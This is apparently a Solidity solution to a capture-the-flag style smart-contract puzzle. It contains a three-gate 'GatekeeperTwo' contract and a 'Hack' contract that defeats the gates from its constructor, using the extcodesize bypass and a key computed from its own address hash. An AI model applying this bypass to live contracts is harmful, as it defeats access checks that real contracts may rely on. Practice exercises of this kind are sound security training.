// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "gate1");
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0, "gate2");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max, "gate3");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hack {

    GatekeeperTwo public gkTwo;
    constructor (address _address) {
        gkTwo = GatekeeperTwo(_address);
        gkTwo.enter(bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this)))))));
    }
}

contract Util {
  
  uint64 public n1;
  uint64 public n2;
  bytes8 public n3;
  bytes8 public n4;

  bool public my_bool;
  
  function util (address _address) public {
        n1 = uint64(bytes8(keccak256(abi.encodePacked(_address))));
        n2 = ~n1;
        n3 = bytes8(n2);

        n4 = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        
        my_bool = uint64(bytes8(keccak256(abi.encodePacked(_address)))) ^ uint64(n3) == type(uint64).max;
    }
}